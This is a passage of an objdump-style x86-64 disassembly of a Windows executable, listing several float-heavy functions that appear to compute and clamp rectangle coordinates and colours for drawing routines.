   140004ab5:	f3 0f 11 44 24 6c    	movss  %xmm0,0x6c(%rsp)
   140004abb:	f3 0f 10 44 24 40    	movss  0x40(%rsp),%xmm0
   140004ac1:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004ac5:	f3 0f 11 44 24 50    	movss  %xmm0,0x50(%rsp)
   140004acb:	f3 0f 10 44 24 44    	movss  0x44(%rsp),%xmm0
   140004ad1:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004ad5:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%rsp)
   140004adb:	f3 0f 10 44 24 4c    	movss  0x4c(%rsp),%xmm0
   140004ae1:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004ae5:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%rsp)
   140004aeb:	e8 d0 ec ff ff       	call   0x1400037c0
   140004af0:	48 8b 8e 98 02 00 00 	mov    0x298(%rsi),%rcx
   140004af7:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140004afc:	f3 0f 11 74 24 30    	movss  %xmm6,0x30(%rsp)
   140004b02:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140004b07:	44 8b c8             	mov    %eax,%r9d
   140004b0a:	f3 0f 11 7c 24 20    	movss  %xmm7,0x20(%rsp)
   140004b10:	e8 9b 18 02 00       	call   0x1400263b0
   140004b15:	48 8b 05 e4 ac 04 00 	mov    0x4ace4(%rip),%rax        # 0x14004f800
   140004b1c:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004b21:	0f 10 80 f4 38 00 00 	movups 0x38f4(%rax),%xmm0
   140004b28:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   140004b2d:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004b31:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140004b38:	00 
   140004b39:	f3 0f 11 44 24 6c    	movss  %xmm0,0x6c(%rsp)
   140004b3f:	e8 7c ec ff ff       	call   0x1400037c0
   140004b44:	48 8b 8e 98 02 00 00 	mov    0x298(%rsi),%rcx
   140004b4b:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140004b50:	f3 0f 11 74 24 30    	movss  %xmm6,0x30(%rsp)
   140004b56:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140004b5b:	44 8b c8             	mov    %eax,%r9d
   140004b5e:	f3 0f 11 7c 24 20    	movss  %xmm7,0x20(%rsp)
   140004b64:	e8 47 18 02 00       	call   0x1400263b0
   140004b69:	0f 28 b4 24 80 00 00 	movaps 0x80(%rsp),%xmm6
   140004b70:	00 
   140004b71:	48 8b b4 24 b8 00 00 	mov    0xb8(%rsp),%rsi
   140004b78:	00 
   140004b79:	0f 28 7c 24 70       	movaps 0x70(%rsp),%xmm7
   140004b7e:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140004b85:	5f                   	pop    %rdi
   140004b86:	c3                   	ret
   140004b87:	cc                   	int3
   140004b88:	cc                   	int3
   140004b89:	cc                   	int3
   140004b8a:	cc                   	int3
   140004b8b:	cc                   	int3
   140004b8c:	cc                   	int3
   140004b8d:	cc                   	int3
   140004b8e:	cc                   	int3
   140004b8f:	cc                   	int3
   140004b90:	4c 8b dc             	mov    %rsp,%r11
   140004b93:	53                   	push   %rbx
   140004b94:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140004b9b:	48 8b 05 5e ac 04 00 	mov    0x4ac5e(%rip),%rax        # 0x14004f800
   140004ba2:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004ba5:	41 0f 29 73 e8       	movaps %xmm6,-0x18(%r11)
   140004baa:	0f 29 7c 24 70       	movaps %xmm7,0x70(%rsp)
   140004baf:	0f 28 fa             	movaps %xmm2,%xmm7
   140004bb2:	49 89 53 a8          	mov    %rdx,-0x58(%r11)
   140004bb6:	f3 0f 10 b0 10 38 00 	movss  0x3810(%rax),%xmm6
   140004bbd:	00 
   140004bbe:	0f 2f f0             	comiss %xmm0,%xmm6
   140004bc1:	48 8b 98 d8 3e 00 00 	mov    0x3ed8(%rax),%rbx
   140004bc8:	49 89 4b b0          	mov    %rcx,-0x50(%r11)
   140004bcc:	0f 86 eb 00 00 00    	jbe    0x140004cbd
   140004bd2:	f3 0f 10 15 0a 36 04 	movss  0x4360a(%rip),%xmm2        # 0x1400481e4
   140004bd9:	00 
   140004bda:	49 8d 4b c0          	lea    -0x40(%r11),%rcx
   140004bde:	0f 10 80 04 39 00 00 	movups 0x3904(%rax),%xmm0
   140004be5:	f3 0f 10 4c 24 48    	movss  0x48(%rsp),%xmm1
   140004beb:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140004bf0:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004bf4:	f3 0f 58 ca          	addss  %xmm2,%xmm1
   140004bf8:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140004bff:	00 
   140004c00:	f3 0f 11 44 24 64    	movss  %xmm0,0x64(%rsp)
   140004c06:	f3 0f 10 44 24 40    	movss  0x40(%rsp),%xmm0
   140004c0c:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004c10:	f3 0f 11 4c 24 50    	movss  %xmm1,0x50(%rsp)
   140004c16:	f3 41 0f 11 43 20    	movss  %xmm0,0x20(%r11)
   140004c1c:	f3 0f 10 44 24 44    	movss  0x44(%rsp),%xmm0
   140004c22:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004c26:	f3 41 0f 11 43 24    	movss  %xmm0,0x24(%r11)
   140004c2c:	f3 0f 10 44 24 4c    	movss  0x4c(%rsp),%xmm0
   140004c32:	f3 0f 58 c2          	addss  %xmm2,%xmm0
   140004c36:	f3 0f 11 44 24 54    	movss  %xmm0,0x54(%rsp)
   140004c3c:	e8 7f eb ff ff       	call   0x1400037c0
   140004c41:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
   140004c48:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140004c4d:	f3 0f 11 74 24 30    	movss  %xmm6,0x30(%rsp)
   140004c53:	4c 8d 84 24 b8 00 00 	lea    0xb8(%rsp),%r8
   140004c5a:	00 
   140004c5b:	44 8b c8             	mov    %eax,%r9d
   140004c5e:	f3 0f 11 7c 24 20    	movss  %xmm7,0x20(%rsp)
   140004c64:	e8 47 17 02 00       	call   0x1400263b0
   140004c69:	48 8b 05 90 ab 04 00 	mov    0x4ab90(%rip),%rax        # 0x14004f800
   140004c70:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140004c75:	0f 10 80 f4 38 00 00 	movups 0x38f4(%rax),%xmm0
   140004c7c:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   140004c81:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004c85:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140004c8c:	00 
   140004c8d:	f3 0f 11 44 24 64    	movss  %xmm0,0x64(%rsp)
   140004c93:	e8 28 eb ff ff       	call   0x1400037c0
   140004c98:	48 8b 8b 98 02 00 00 	mov    0x298(%rbx),%rcx
   140004c9f:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   140004ca4:	f3 0f 11 74 24 30    	movss  %xmm6,0x30(%rsp)
   140004caa:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140004caf:	44 8b c8             	mov    %eax,%r9d
   140004cb2:	f3 0f 11 7c 24 20    	movss  %xmm7,0x20(%rsp)
   140004cb8:	e8 f3 16 02 00       	call   0x1400263b0
   140004cbd:	0f 28 b4 24 80 00 00 	movaps 0x80(%rsp),%xmm6
   140004cc4:	00 
   140004cc5:	0f 28 7c 24 70       	movaps 0x70(%rsp),%xmm7
   140004cca:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140004cd1:	5b                   	pop    %rbx
   140004cd2:	c3                   	ret
   140004cd3:	cc                   	int3
   140004cd4:	cc                   	int3
   140004cd5:	cc                   	int3
   140004cd6:	cc                   	int3
   140004cd7:	cc                   	int3
   140004cd8:	cc                   	int3
   140004cd9:	cc                   	int3
   140004cda:	cc                   	int3
   140004cdb:	cc                   	int3
   140004cdc:	cc                   	int3
   140004cdd:	cc                   	int3
   140004cde:	cc                   	int3
   140004cdf:	cc                   	int3
   140004ce0:	40 55                	rex push %rbp
   140004ce2:	56                   	push   %rsi
   140004ce3:	48 8d 6c 24 f8       	lea    -0x8(%rsp),%rbp
   140004ce8:	48 81 ec 08 01 00 00 	sub    $0x108,%rsp
   140004cef:	48 8b 05 0a ab 04 00 	mov    0x4ab0a(%rip),%rax        # 0x14004f800
   140004cf6:	41 8b f0             	mov    %r8d,%esi
   140004cf9:	3b 90 c0 48 00 00    	cmp    0x48c0(%rax),%edx
   140004cff:	0f 85 0c 04 00 00    	jne    0x140005111
   140004d05:	80 b8 f6 48 00 00 00 	cmpb   $0x0,0x48f6(%rax)
   140004d0c:	74 0a                	je     0x140004d18
   140004d0e:	40 f6 c6 04          	test   $0x4,%sil
   140004d12:	0f 84 f9 03 00 00    	je     0x140005111
   140004d18:	48 89 bc 24 28 01 00 	mov    %rdi,0x128(%rsp)
   140004d1f:	00 
   140004d20:	48 8b b8 d8 3e 00 00 	mov    0x3ed8(%rax),%rdi
   140004d27:	80 bf 61 01 00 00 00 	cmpb   $0x0,0x161(%rdi)
   140004d2e:	0f 85 d5 03 00 00    	jne    0x140005109
   140004d34:	0f 29 b4 24 f0 00 00 	movaps %xmm6,0xf0(%rsp)
   140004d3b:	00 
   140004d3c:	0f 29 bc 24 e0 00 00 	movaps %xmm7,0xe0(%rsp)
   140004d43:	00 
   140004d44:	44 0f 29 84 24 d0 00 	movaps %xmm8,0xd0(%rsp)
   140004d4b:	00 00 
   140004d4d:	44 0f 29 8c 24 c0 00 	movaps %xmm9,0xc0(%rsp)
   140004d54:	00 00 
   140004d56:	44 0f 29 9c 24 a0 00 	movaps %xmm11,0xa0(%rsp)
   140004d5d:	00 00 
   140004d5f:	44 0f 29 a4 24 90 00 	movaps %xmm12,0x90(%rsp)
   140004d66:	00 00 
   140004d68:	44 0f 29 ac 24 80 00 	movaps %xmm13,0x80(%rsp)
   140004d6f:	00 00 
   140004d71:	44 0f 29 94 24 b0 00 	movaps %xmm10,0xb0(%rsp)
   140004d78:	00 00 
   140004d7a:	40 f6 c6 08          	test   $0x8,%sil
   140004d7e:	74 06                	je     0x140004d86
   140004d80:	45 0f 57 d2          	xorps  %xmm10,%xmm10
   140004d84:	eb 09                	jmp    0x140004d8f
   140004d86:	f3 44 0f 10 90 0c 38 	movss  0x380c(%rax),%xmm10
   140004d8d:	00 00 
   140004d8f:	f3 0f 10 af 3c 02 00 	movss  0x23c(%rdi),%xmm5
   140004d96:	00 
   140004d97:	f3 44 0f 10 af 44 02 	movss  0x244(%rdi),%xmm13
   140004d9e:	00 00 
   140004da0:	f3 44 0f 10 a7 40 02 	movss  0x240(%rdi),%xmm12
   140004da7:	00 00 
   140004da9:	f3 44 0f 10 1d 32 34 	movss  0x43432(%rip),%xmm11        # 0x1400481e4
   140004db0:	04 00 
   140004db2:	48 89 9c 24 20 01 00 	mov    %rbx,0x120(%rsp)
   140004db9:	00 
   140004dba:	0f 10 31             	movups (%rcx),%xmm6
   140004dbd:	44 0f 28 c6          	movaps %xmm6,%xmm8
   140004dc1:	44 0f 28 ce          	movaps %xmm6,%xmm9
   140004dc5:	44 0f c6 c6 55       	shufps $0x55,%xmm6,%xmm8
   140004dca:	0f 28 fe             	movaps %xmm6,%xmm7
   140004dcd:	44 0f c6 ce ff       	shufps $0xff,%xmm6,%xmm9
   140004dd2:	f3 44 0f 5f c5       	maxss  %xmm5,%xmm8
   140004dd7:	0f c6 f6 aa          	shufps $0xaa,%xmm6,%xmm6
   140004ddb:	f3 45 0f 5d cd       	minss  %xmm13,%xmm9
   140004de0:	f3 41 0f 5d f4       	minss  %xmm12,%xmm6
   140004de5:	f3 0f 5f bf 38 02 00 	maxss  0x238(%rdi),%xmm7
   140004dec:	00 
   140004ded:	40 f6 c6 01          	test   $0x1,%sil
   140004df1:	0f 84 d8 01 00 00    	je     0x140004fcf
   140004df7:	f3 0f 10 05 59 34 04 	movss  0x43459(%rip),%xmm0        # 0x140048258
   140004dfe:	00 
   140004dff:	f3 44 0f 5c c0       	subss  %xmm0,%xmm8
   140004e04:	4c 89 bc 24 00 01 00 	mov    %r15,0x100(%rsp)
   140004e0b:	00 
   140004e0c:	f3 0f 5c f8          	subss  %xmm0,%xmm7
   140004e10:	44 0f 29 74 24 70    	movaps %xmm14,0x70(%rsp)
   140004e16:	44 0f 29 7c 24 60    	movaps %xmm15,0x60(%rsp)
   140004e1c:	f3 0f 58 f0          	addss  %xmm0,%xmm6
   140004e20:	f3 44 0f 58 c8       	addss  %xmm0,%xmm9
   140004e25:	41 0f 28 d0          	movaps %xmm8,%xmm2
   140004e29:	41 0f 28 c8          	movaps %xmm8,%xmm1
   140004e2d:	0f 2f bf 38 02 00 00 	comiss 0x238(%rdi),%xmm7
   140004e34:	72 19                	jb     0x140004e4f
   140004e36:	0f 2f d5             	comiss %xmm5,%xmm2
   140004e39:	72 14                	jb     0x140004e4f
   140004e3b:	44 0f 2f e6          	comiss %xmm6,%xmm12
   140004e3f:	72 0e                	jb     0x140004e4f
   140004e41:	45 0f 2f e9          	comiss %xmm9,%xmm13
   140004e45:	72 08                	jb     0x140004e4f
   140004e47:	41 b7 01             	mov    $0x1,%r15b
   140004e4a:	e9 9c 00 00 00       	jmp    0x140004eeb
   140004e4f:	4c 89 b4 24 30 01 00 	mov    %r14,0x130(%rsp)
   140004e56:	00 
   140004e57:	f3 41 0f 5f c9       	maxss  %xmm9,%xmm1
   140004e5c:	4c 8b b7 98 02 00 00 	mov    0x298(%rdi),%r14
   140004e63:	0f 28 c7             	movaps %xmm7,%xmm0
   140004e66:	f3 0f 5f c6          	maxss  %xmm6,%xmm0
   140004e6a:	f3 0f 11 7c 24 40    	movss  %xmm7,0x40(%rsp)
   140004e70:	45 32 ff             	xor    %r15b,%r15b
   140004e73:	f3 0f 11 54 24 44    	movss  %xmm2,0x44(%rsp)
   140004e79:	45 8b 46 5c          	mov    0x5c(%r14),%r8d
   140004e7d:	41 8b 4e 58          	mov    0x58(%r14),%ecx
   140004e81:	f3 0f 11 44 24 48    	movss  %xmm0,0x48(%rsp)
   140004e87:	f3 0f 11 4c 24 4c    	movss  %xmm1,0x4c(%rsp)
   140004e8d:	41 3b c8             	cmp    %r8d,%ecx
   140004e90:	75 29                	jne    0x140004ebb
   140004e92:	ff c1                	inc    %ecx
   140004e94:	45 85 c0             	test   %r8d,%r8d
   140004e97:	74 0d                	je     0x140004ea6
   140004e99:	41 8b c0             	mov    %r8d,%eax
   140004e9c:	99                   	cltd
   140004e9d:	2b c2                	sub    %edx,%eax
   140004e9f:	d1 f8                	sar    $1,%eax
   140004ea1:	41 03 c0             	add    %r8d,%eax
   140004ea4:	eb 05                	jmp    0x140004eab
   140004ea6:	b8 08 00 00 00       	mov    $0x8,%eax
   140004eab:	3b c1                	cmp    %ecx,%eax
   140004ead:	0f 4f c8             	cmovg  %eax,%ecx
   140004eb0:	8b d1                	mov    %ecx,%edx
   140004eb2:	49 8d 4e 58          	lea    0x58(%r14),%rcx
   140004eb6:	e8 95 6b 01 00       	call   0x14001ba50
   140004ebb:	49 63 56 58          	movslq 0x58(%r14),%rdx
   140004ebf:	49 8b ce             	mov    %r14,%rcx
   140004ec2:	49 8b 46 60          	mov    0x60(%r14),%rax
   140004ec6:	48 03 d2             	add    %rdx,%rdx
   140004ec9:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140004ece:	0f 11 04 d0          	movups %xmm0,(%rax,%rdx,8)
   140004ed2:	41 ff 46 58          	incl   0x58(%r14)
   140004ed6:	41 0f 11 86 88 00 00 	movups %xmm0,0x88(%r14)
   140004edd:	00 
   140004ede:	e8 bd ea 01 00       	call   0x1400239a0
   140004ee3:	4c 8b b4 24 30 01 00 	mov    0x130(%rsp),%r14
   140004eea:	00 
   140004eeb:	48 8b 05 0e a9 04 00 	mov    0x4a90e(%rip),%rax        # 0x14004f800
   140004ef2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004ef7:	41 0f 28 c9          	movaps %xmm9,%xmm1
   140004efb:	f3 41 0f 5c cb       	subss  %xmm11,%xmm1
   140004f00:	0f 10 80 b4 3b 00 00 	movups 0x3bb4(%rax),%xmm0
   140004f07:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004f0c:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   140004f10:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140004f17:	00 
   140004f18:	f3 0f 11 4d 3c       	movss  %xmm1,0x3c(%rbp)
   140004f1d:	41 0f 28 c8          	movaps %xmm8,%xmm1
   140004f21:	f3 41 0f 58 cb       	addss  %xmm11,%xmm1
   140004f26:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%rsp)
   140004f2c:	0f 28 c6             	movaps %xmm6,%xmm0
   140004f2f:	f3 41 0f 5c c3       	subss  %xmm11,%xmm0
   140004f34:	f3 0f 11 4c 24 44    	movss  %xmm1,0x44(%rsp)
   140004f3a:	f3 0f 11 45 38       	movss  %xmm0,0x38(%rbp)
   140004f3f:	0f 28 c7             	movaps %xmm7,%xmm0
   140004f42:	f3 41 0f 58 c3       	addss  %xmm11,%xmm0
   140004f47:	f3 0f 11 44 24 40    	movss  %xmm0,0x40(%rsp)
   140004f4d:	e8 6e e8 ff ff       	call   0x1400037c0
   140004f52:	f3 0f 10 05 ae 32 04 	movss  0x432ae(%rip),%xmm0        # 0x140048208
   140004f59:	00 
   140004f5a:	4c 8d 45 38          	lea    0x38(%rbp),%r8
   140004f5e:	48 8b 8f 98 02 00 00 	mov    0x298(%rdi),%rcx
   140004f65:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004f6a:	f3 0f 11 44 24 30    	movss  %xmm0,0x30(%rsp)
   140004f70:	44 8b c8             	mov    %eax,%r9d
   140004f73:	f3 44 0f 11 54 24 20 	movss  %xmm10,0x20(%rsp)
   140004f7a:	e8 31 14 02 00       	call   0x1400263b0
   140004f7f:	44 0f 28 7c 24 60    	movaps 0x60(%rsp),%xmm15
   140004f85:	45 84 ff             	test   %r15b,%r15b
   140004f88:	4c 8b bc 24 00 01 00 	mov    0x100(%rsp),%r15
   140004f8f:	00 
   140004f90:	44 0f 28 74 24 70    	movaps 0x70(%rsp),%xmm14
   140004f96:	75 37                	jne    0x140004fcf
   140004f98:	48 8b 8f 98 02 00 00 	mov    0x298(%rdi),%rcx
   140004f9f:	8b 41 58             	mov    0x58(%rcx),%eax
   140004fa2:	83 e8 01             	sub    $0x1,%eax
   140004fa5:	89 41 58             	mov    %eax,0x58(%rcx)
   140004fa8:	75 0a                	jne    0x140004fb4
   140004faa:	48 8b 41 38          	mov    0x38(%rcx),%rax
   140004fae:	48 83 c0 1c          	add    $0x1c,%rax
   140004fb2:	eb 0c                	jmp    0x140004fc0
   140004fb4:	ff c8                	dec    %eax
   140004fb6:	48 98                	cltq
   140004fb8:	48 c1 e0 04          	shl    $0x4,%rax
   140004fbc:	48 03 41 60          	add    0x60(%rcx),%rax
   140004fc0:	0f 10 00             	movups (%rax),%xmm0
   140004fc3:	0f 11 81 88 00 00 00 	movups %xmm0,0x88(%rcx)
   140004fca:	e8 d1 e9 01 00       	call   0x1400239a0
   140004fcf:	44 0f 28 ac 24 80 00 	movaps 0x80(%rsp),%xmm13
   140004fd6:	00 00 
   140004fd8:	44 0f 28 a4 24 90 00 	movaps 0x90(%rsp),%xmm12
   140004fdf:	00 00 
   140004fe1:	40 f6 c6 02          	test   $0x2,%sil
   140004fe5:	0f 84 e2 00 00 00    	je     0x1400050cd
   140004feb:	48 8b 05 0e a8 04 00 	mov    0x4a80e(%rip),%rax        # 0x14004f800
   140004ff2:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004ff7:	48 8b 9f 98 02 00 00 	mov    0x298(%rdi),%rbx
   140004ffe:	0f 10 80 b4 3b 00 00 	movups 0x3bb4(%rax),%xmm0
   140005005:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000500a:	0f c6 c0 ff          	shufps $0xff,%xmm0,%xmm0
   14000500e:	f3 0f 59 80 c8 37 00 	mulss  0x37c8(%rax),%xmm0
   140005015:	00 
   140005016:	f3 0f 11 44 24 5c    	movss  %xmm0,0x5c(%rsp)
   14000501c:	e8 9f e7 ff ff       	call   0x1400037c0
   140005021:	8b f0                	mov    %eax,%esi
   140005023:	a9 00 00 00 ff       	test   $0xff000000,%eax
   140005028:	0f 84 9f 00 00 00    	je     0x1400050cd
   14000502e:	33 ff                	xor    %edi,%edi
   140005030:	4c 8d 45 38          	lea    0x38(%rbp),%r8
   140005034:	f6 43 30 01          	testb  $0x1,0x30(%rbx)
   140005038:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   14000503d:	41 0f 28 da          	movaps %xmm10,%xmm3
   140005041:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   140005045:	48 8b cb             	mov    %rbx,%rcx
   140005048:	74 1c                	je     0x140005066
   14000504a:	f3 0f 10 05 5e 31 04 	movss  0x4315e(%rip),%xmm0        # 0x1400481b0
   140005051:	00 
   140005052:	f3 0f 5c f0          	subss  %xmm0,%xmm6
   140005056:	f3 44 0f 5c c8       	subss  %xmm0,%xmm9
   14000505b:	f3 0f 58 f8          	addss  %xmm0,%xmm7
   14000505f:	f3 44 0f 58 c0       	addss  %xmm0,%xmm8
   140005064:	eb 22                	jmp    0x140005088
   140005066:	f3 0f 5c 35 3e 31 04 	subss  0x4313e(%rip),%xmm6        # 0x1400481ac
   14000506d:	00 
   14000506e:	f3 44 0f 5c 0d 35 31 	subss  0x43135(%rip),%xmm9        # 0x1400481ac
   140005075:	04 00 
   140005077:	f3 0f 58 3d 31 31 04 	addss  0x43131(%rip),%xmm7        # 0x1400481b0
   14000507e:	00 
   14000507f:	f3 44 0f 58 05 28 31 	addss  0x43128(%rip),%xmm8        # 0x1400481b0
   140005086:	04 00 
   140005088:	f3 0f 11 75 38       	movss  %xmm6,0x38(%rbp)
   14000508d:	f3 44 0f 11 4d 3c    	movss  %xmm9,0x3c(%rbp)
   140005093:	f3 0f 11 7c 24 40    	movss  %xmm7,0x40(%rsp)
   140005099:	f3 44 0f 11 44 24 44 	movss  %xmm8,0x44(%rsp)
   1400050a0:	e8 8b 0d 02 00       	call   0x140025e30
   1400050a5:	44 8b 43 78          	mov    0x78(%rbx),%r8d
   1400050a9:	44 8b ce             	mov    %esi,%r9d
   1400050ac:	48 8b 93 80 00 00 00 	mov    0x80(%rbx),%rdx
   1400050b3:	48 8b cb             	mov    %rbx,%rcx
   1400050b6:	f3 44 0f 11 5c 24 28 	movss  %xmm11,0x28(%rsp)
   1400050bd:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400050c4:	00 
   1400050c5:	e8 b6 ee 01 00       	call   0x140023f80
   1400050ca:	89 7b 78             	mov    %edi,0x78(%rbx)
   1400050cd:	48 8b 9c 24 20 01 00 	mov    0x120(%rsp),%rbx
   1400050d4:	00 
   1400050d5:	44 0f 28 94 24 b0 00 	movaps 0xb0(%rsp),%xmm10
   1400050dc:	00 00 
   1400050de:	44 0f 28 84 24 d0 00 	movaps 0xd0(%rsp),%xmm8
   1400050e5:	00 00 
   1400050e7:	0f 28 bc 24 e0 00 00 	movaps 0xe0(%rsp),%xmm7
   1400050ee:	00 
   1400050ef:	0f 28 b4 24 f0 00 00 	movaps 0xf0(%rsp),%xmm6
   1400050f6:	00 
   1400050f7:	44 0f 28 8c 24 c0 00 	movaps 0xc0(%rsp),%xmm9
   1400050fe:	00 00 
   140005100:	44 0f 28 9c 24 a0 00 	movaps 0xa0(%rsp),%xmm11
   140005107:	00 00 
   140005109:	48 8b bc 24 28 01 00 	mov    0x128(%rsp),%rdi
   140005110:	00 
   140005111:	48 81 c4 08 01 00 00 	add    $0x108,%rsp
   140005118:	5e                   	pop    %rsi
   140005119:	5d                   	pop    %rbp
   14000511a:	c3                   	ret
   14000511b:	cc                   	int3
   14000511c:	cc                   	int3
   14000511d:	cc                   	int3
   14000511e:	cc                   	int3
   14000511f:	cc                   	int3
   140005120:	4c 8b dc             	mov    %rsp,%r11
   140005123:	55                   	push   %rbp
   140005124:	41 54                	push   %r12
   140005126:	41 55                	push   %r13
   140005128:	41 56                	push   %r14
   14000512a:	49 8d 6b 88          	lea    -0x78(%r11),%rbp
   14000512e:	48 81 ec 58 01 00 00 	sub    $0x158,%rsp
   140005135:	45 0f 29 a3 68 ff ff 	movaps %xmm12,-0x98(%r11)
   14000513c:	ff 
   14000513d:	48 8b 05 fc 9e 04 00 	mov    0x49efc(%rip),%rax        # 0x14004f040
   140005144:	48 33 c4             	xor    %rsp,%rax
   140005147:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   14000514b:	4c 8b 2d ae a6 04 00 	mov    0x4a6ae(%rip),%r13        # 0x14004f800
   140005152:	45 33 f6             	xor    %r14d,%r14d
   140005155:	44 89 44 24 40       	mov    %r8d,0x40(%rsp)
   14000515a:	44 0f 28 e1          	movaps %xmm1,%xmm12
   14000515e:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140005163:	49 8b 85 20 3c 00 00 	mov    0x3c20(%r13),%rax
   14000516a:	4c 8b 60 40          	mov    0x40(%rax),%r12
   14000516e:	45 39 b5 a8 48 00 00 	cmp    %r14d,0x48a8(%r13)
   140005175:	0f 8e e0 04 00 00    	jle    0x14000565b
   14000517b:	4d 89 7b d8          	mov    %r15,-0x28(%r11)
   14000517f:	4c 8d 0d 4a 11 04 00 	lea    0x4114a(%rip),%r9        # 0x1400462d0
   140005186:	41 0f 29 7b b8       	movaps %xmm7,-0x48(%r11)
   14000518b:	45 33 ff             	xor    %r15d,%r15d
   14000518e:	f3 0f 10 3d 72 30 04 	movss  0x43072(%rip),%xmm7        # 0x140048208
   140005195:	00 
   140005196:	45 0f 29 b3 48 ff ff 	movaps %xmm14,-0xb8(%r11)
   14000519d:	ff 
   14000519e:	45 0f 57 f6          	xorps  %xmm14,%xmm14
   1400051a2:	45 0f 29 bb 38 ff ff 	movaps %xmm15,-0xc8(%r11)
   1400051a9:	ff 
   1400051aa:	f3 44 0f 10 3d 31 30 	movss  0x43031(%rip),%xmm15        # 0x1400481e4
   1400051b1:	04 00 
   1400051b3:	49 89 5b 10          	mov    %rbx,0x10(%r11)
   1400051b7:	49 89 73 18          	mov    %rsi,0x18(%r11)
   1400051bb:	49 89 7b 20          	mov    %rdi,0x20(%r11)
   1400051bf:	41 0f 29 73 c8       	movaps %xmm6,-0x38(%r11)
   1400051c4:	45 0f 29 43 a8       	movaps %xmm8,-0x58(%r11)
   1400051c9:	45 0f 29 4b 98       	movaps %xmm9,-0x68(%r11)
   1400051ce:	45 0f 29 53 88       	movaps %xmm10,-0x78(%r11)
   1400051d3:	45 0f 29 9b 78 ff ff 	movaps %xmm11,-0x88(%r11)
   1400051da:	ff 
   1400051db:	45 0f 29 ab 58 ff ff 	movaps %xmm13,-0xa8(%r11)
   1400051e2:	ff 
   1400051e3:	0f 1f 40 00          	nopl   0x0(%rax)
   1400051e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400051ee:	00 00 
   1400051f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400051f3:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400051f6:	0f 11 45 88          	movups %xmm0,-0x78(%rbp)
   1400051fa:	0f 11 4d 98          	movups %xmm1,-0x68(%rbp)
   1400051fe:	41 83 f8 08          	cmp    $0x8,%r8d
   140005202:	0f 87 d0 03 00 00    	ja     0x1400055d8
   140005208:	41 f6 04 24 02       	testb  $0x2,(%r12)
   14000520d:	0f 85 c5 03 00 00    	jne    0x1400055d8
   140005213:	f3 41 0f 10 6c 24 48 	movss  0x48(%r12),%xmm5
   14000521a:	49 8b 4c 24 70       	mov    0x70(%r12),%rcx
   14000521f:	49 63 94 24 94 04 00 	movslq 0x494(%r12),%rdx
   140005226:	00 
   140005227:	f3 44 0f 10 6c 24 54 	movss  0x54(%rsp),%xmm13
   14000522e:	f3 44 0f 10 4c 24 50 	movss  0x50(%rsp),%xmm9
   140005235:	49 63 c0             	movslq %r8d,%rax
   140005238:	48 c1 e2 05          	shl    $0x5,%rdx
   14000523c:	4c 8d 04 40          	lea    (%rax,%rax,2),%r8
   140005240:	0f b7 44 0a 04       	movzwl 0x4(%rdx,%rcx,1),%eax
   140005245:	f3 47 0f 10 44 c1 08 	movss  0x8(%r9,%r8,8),%xmm8
   14000524c:	f3 47 0f 5c 6c c1 14 	subss  0x14(%r9,%r8,8),%xmm13
   140005253:	f3 47 0f 10 54 c1 0c 	movss  0xc(%r9,%r8,8),%xmm10
   14000525a:	41 0f 28 c8          	movaps %xmm8,%xmm1
   14000525e:	f3 47 0f 5c 4c c1 10 	subss  0x10(%r9,%r8,8),%xmm9
   140005265:	66 0f 6e f0          	movd   %eax,%xmm6
   140005269:	41 0f 28 d2          	movaps %xmm10,%xmm2
   14000526d:	0f b7 44 0a 06       	movzwl 0x6(%rdx,%rcx,1),%eax
   140005272:	45 0f 28 d8          	movaps %xmm8,%xmm11
   140005276:	0f 5b f6             	cvtdq2ps %xmm6,%xmm6
   140005279:	f3 44 0f 58 df       	addss  %xmm7,%xmm11
   14000527e:	f3 44 0f 11 6c 24 4c 	movss  %xmm13,0x4c(%rsp)
